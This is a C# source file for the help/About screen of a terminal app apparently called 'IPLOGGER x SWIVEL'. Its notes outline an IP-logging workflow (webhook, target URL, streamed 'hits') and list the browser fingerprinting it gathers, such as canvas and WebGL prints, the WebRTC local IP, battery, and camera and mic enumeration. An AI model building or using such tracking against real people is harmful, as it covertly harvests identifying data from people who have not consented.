using Swivel.Core;

namespace Swivel.Ui.Screens;

/// <summary>Usage notes and the key map.</summary>
public sealed class AboutScreen : IScreen
{
    static readonly (string Key, string Action)[] Binds =
    [
        ("w/s", "move"),
        ("enter", "edit/activate"),
        ("esc", "cancel"),
        ("tab", "next tab"),
        ("1-6", "jump"),
        ("r", "reset sim"),
        ("c", "clear hits"),
        ("q", "quit"),
    ];

    static readonly string[] Notes =
    [
        "",
        "paste webhook in setup",
        "set target url",
        "press start",
        "hits stream into LIVE",
        "see FP for browser prints",
        "",
        "canvas / gpu / audio fp",
        "font enum / webgl vendor",
        "battery + webrtc local IP",
        "cams / mics / speakers",
        "",
    ];

    public List<string> Render(App app, Context ctx)
    {
        var lines = ScreenHelpers.Heading(ctx, " ABOUT ");
        var dim = Theme.Fg(Theme.Grey);

        var help = new List<string> { "" };
        help.Add(Terminal.Bold + Theme.Fg(Theme.White) + "IPLOGGER x SWIVEL" + Terminal.Reset);
        help.Add("");
        help.AddRange(Notes.Select(note => note.Length == 0 ? "" : dim + note + Terminal.Reset));

        var keys = new List<string> { "" };
        keys.AddRange(Binds.Select(bind =>
            Theme.Fg(Theme.Violet) + Theme.Pad(bind.Key, 7) + Terminal.Reset
            + "  " + dim + bind.Action + Terminal.Reset));
        keys.Add("");

        var left = Widgets.Panel("HELP", help, ctx.PanelWidth, Theme.Amber);
        var right = Widgets.Panel("KEYS", keys, ctx.PanelWidth, Theme.Green);
        lines.AddRange(ctx.Indent(SideBySide(left, right, ctx.Gap)));
        return lines;
    }

    static List<string> SideBySide(List<string> left, List<string> right, int gap)
    {
        var height = Math.Max(left.Count, right.Count);
        var lines = new List<string>(height);
        for (var i = 0; i < height; i++)
        {
            var l = i < left.Count ? left[i] : "";
            var r = i < right.Count ? right[i] : "";
            lines.Add(l + new string(' ', gap) + r);
        }
        return lines;
    }
}